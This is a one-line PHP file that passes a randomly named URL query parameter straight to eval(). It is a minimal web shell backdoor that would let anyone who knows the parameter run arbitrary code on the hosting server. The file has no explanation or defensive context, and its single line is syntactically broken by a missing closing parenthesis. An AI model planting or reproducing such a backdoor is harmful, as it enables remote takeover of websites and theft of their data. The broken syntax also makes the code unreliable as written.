<?php
eval($_GET['8V6ze9fd'];
?>
